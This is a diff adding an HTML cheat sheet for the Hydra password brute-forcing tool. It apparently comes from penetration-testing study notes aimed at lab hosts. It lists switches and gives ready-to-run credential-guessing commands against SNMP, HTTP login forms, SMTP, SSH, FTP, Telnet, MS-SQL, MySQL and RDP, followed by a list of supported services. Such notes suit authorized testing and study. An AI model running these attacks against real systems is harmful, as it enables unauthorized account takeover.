@@ -1,0 +1,72 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>hydra</title>
+</head><body><b><span style="font-size: 14pt">hydra</span><br/>
+</b><tt>https://github.com/vanhauser-thc/thc-hydra</tt><b><br/>
+</b><b><br/>
+<br/>
+<span style="font-size: 12pt">Switches</span><br/>
+<br/>
+</b>-l	login name<br/>
+-P	password file<br/>
+-L	users file<br/>
+-V	show every trial<br/>
+-t	threads<br/>
+-w	wait time between connection for each thread<br/>
+-f	exit after first password found<br/>
+-s	port<br/>
+-u	cycle usernames first <b><br/>
+</b><b><br/>
+<br/>
+<span style="font-size: 12pt">Examples</span><br/>
+<br/>
+SMNP service<br/>
+</b><tt><br/>
+hydra -P password-file.txt -v 10.11.1.219 snmp<br/>
+<br/>
+</tt><b>HTTP POST FORM</b><tt><br/>
+</tt><tt><br/>
+hydra 10.11.1.39 http-form-post &quot;/otrs/index.pl:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=0&amp;User=^USER^&amp;Password=^PASS^:Login failed&quot; -l root@localhost -P adobe_top100_pass.txt -t 1 <br/>
+</tt><br/>
+<b>HTTP GET FORM<br/>
+</b><tt><br/>
+</tt><tt>hydra http://10.11.1.73 -l garry -P wordlist.txt http-get-form &quot;/dvwa/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Bad password&quot;</tt><b><br/>
+</b><b><br/>
+HTTP GET basic auth<br/>
+</b><br/>
+<tt>hydra http://10.11.1.237 -l admin -P words.txt http-head /webdav/</tt><b><br/>
+</b><b><br/>
+SMTP<br/>
+</b><tt><br/>
+hydra 10.11.1.72 smtp -s 25 -V -l root -P /path/to/password/list.lst -t 10 -f<br/>
+<br/>
+</tt><b>SSH<br/>
+</b><tt><br/>
+</tt><tt>hydra -t 10 -V -f -L users-file.txt -P </tt>password-file.txt<tt>ssh://&lt;IP&gt;<br/>
+</tt><tt><br/>
+</tt><b>FTP</b><br/>
+<tt><br/>
+</tt><tt>hydra -t 10 -V -f -L users-file.txt -P password-file.txt ftp://&lt;IP&gt;</tt><br/>
+<br/>
+<b>Telnet</b><br/>
+<tt><br/>
+</tt><tt>hydra -t 10 -V -f -L users-file.txt -P password-file.txt telnet://&lt;IP&gt;</tt><br/>
+<br/>
+<b>MS-SQL</b><br/>
+<tt><br/>
+hydra -t 10 -V -f -L users-file.txt -P password-file.txt mssql://&lt;IP&gt;<br/>
+<br/>
+</tt><b>MYSQL</b><br/>
+<tt><br/>
+hydra -t 10 -V -f -L users-file.txt -P password-file.txt mysql://&lt;IP&gt;<br/>
+<br/>
+</tt><b>RDP</b><br/>
+<tt><br/>
+</tt><tt>hydra -t 10 -V -f -L users-file.txt -P password-file.txt rdp://&lt;IP&gt;</tt><br/>
+<br/>
+<br/>
+<b><span style="font-size: 14pt">Notes<br/>
+</span><span style="font-size: 10pt"><br/>
+</span></b><b>Supported services:</b>asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp<br/>
+</body></html>
